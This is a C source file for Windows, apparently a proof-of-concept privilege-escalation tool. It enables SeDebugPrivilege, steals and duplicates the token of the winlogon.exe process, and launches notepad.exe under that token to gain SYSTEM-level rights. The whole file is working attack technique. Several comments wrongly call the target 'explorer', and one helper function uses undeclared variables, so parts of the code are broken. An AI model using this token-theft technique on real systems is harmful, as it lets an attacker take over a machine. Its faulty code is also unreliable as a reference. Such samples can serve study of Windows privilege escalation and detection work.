#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

#define TRUE 1
#define FALSE 0

#define EXECUTE "C:\\Windows\\notepad.exe"

void set_debug_priv()
{
  HANDLE token;
  LUID l_uid;
  TOKEN_PRIVILEGES token_priv;
  
  // Grab user's token. 
  if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token) == FALSE)
    printf("[-] OpenProcessToken: GetLastError = %#08lx\n", GetLastError());

  // Adjust the token's privilege to enable SE_DEBUG.
  if(LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &l_uid) == FALSE)
    printf("[-] LookupPrivilegeValueA: GetLastError = %#08lx\n", GetLastError());
    
  token_priv.PrivilegeCount = 1;
  token_priv.Privileges[0].Luid = l_uid;
  token_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  
  if (AdjustTokenPrivileges(token, FALSE, &token_priv, sizeof(token_priv), NULL, NULL) == FALSE)
    printf("[-] AdjustTokenPrivileges: GetLastError = %#08lx\n", GetLastError());

  CloseHandle(token);
}

int adjust_token_priv(HANDLE &token)
{
  // Adjust the token's privilege to enable SE_DEBUG.
  if(LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &l_uid) == FALSE)
    printf("[-] LookupPrivilegeValueA: GetLastError = %#08lx\n", GetLastError());
    
  token_priv.PrivilegeCount = 1;
  token_priv.Privileges[0].Luid = l_uid;
  token_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  
  if (AdjustTokenPrivileges(token, FALSE, &token_priv, sizeof(token_priv), NULL, NULL) == FALSE)
    printf("[-] AdjustTokenPrivileges: GetLastError = %#08lx\n", GetLastError());

  CloseHandle(token);
  
}

int main(int argc, char** argv)
{
  // Enable SE_DEBUG.
  set_debug_priv();

  PROCESSENTRY32 entry;
  entry.dwSize = sizeof(PROCESSENTRY32);

  // Crate snapshot of all currently running processes.
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (Process32First(snapshot, &entry) == FALSE) {
    printf("[-] Process32First: GetLastError = %#08lx\n", GetLastError()); 
    exit(1);
  }

  while (Process32Next(snapshot, &entry) == TRUE) {
    if (stricmp(entry.szExeFile, "winlogon.exe") == 0) {
      // Get a handle to explorer
      HANDLE h_explorer = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, entry.th32ProcessID);
      if (h_explorer == NULL)
        printf("[-] OpenProcess: GetLastError = %#08lx\n", GetLastError()); 
      
      HANDLE tok_explorer;
      if(!OpenProcessToken(h_explorer, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tok_explorer))
        printf("[-] OpenProcessToken: GetLastError = %#08lx\n", GetLastError()); 

      HANDLE h_dup_tok;
      if (!DuplicateTokenEx(tok_explorer, MAXIMUM_ALLOWED, 0, SecurityImpersonation, TokenImpersonation, &h_dup_tok))
        printf("[-] DuplicateTokenEx: GetLastError = %#08lx\n", GetLastError()); 
        
      if (!ImpersonateLoggedOnUser(tok_explorer))
        printf("[-] ImpersonateLoggedOnUser: GetLastError = %#08lx\n", GetLastError()); 

      CloseHandle(h_explorer);

      // Create process with token from explorer.
      PROCESS_INFORMATION pi;
      STARTUPINFO si;
      memset(&pi, 0, sizeof(pi));
      memset(&si, 0, sizeof(si));

      if (CreateProcessAsUserA(h_dup_tok,
                               EXECUTE,
                               NULL, 
                               NULL, 
                               NULL, 
                               TRUE, 
                               NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, 
                               NULL, 
                               NULL, 
                               &si, 
                               &pi) == FALSE)
        printf("[-] CreateProcessAsUserA: GetLastError = %#08lx\n", GetLastError()); 
      
      // Cleanup handles.
      CloseHandle(pi.hThread);
      CloseHandle(pi.hProcess);
      CloseHandle(h_dup_tok);
    }
  }

  CloseHandle(snapshot);
  
  return 0;
}
